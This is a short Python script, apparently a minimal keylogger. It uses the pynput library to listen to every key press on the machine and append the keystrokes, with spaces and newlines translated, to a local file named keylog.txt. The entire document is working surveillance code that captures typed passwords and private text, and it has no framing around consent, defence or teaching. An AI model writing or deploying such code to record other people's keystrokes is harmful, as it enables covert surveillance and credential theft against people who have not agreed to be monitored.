from pynput.keyboard import Key, Listener

# Define the function to write the key presses to a file
def on_press(key):
    with open("keylog.txt", "a") as f:
        if key == Key.space:
            f.write(" ")
        elif key == Key.enter:
            f.write("\n")
        else:
            f.write(str(key).replace("'", ""))

with Listener(on_press=on_press) as listener:
    listener.join()
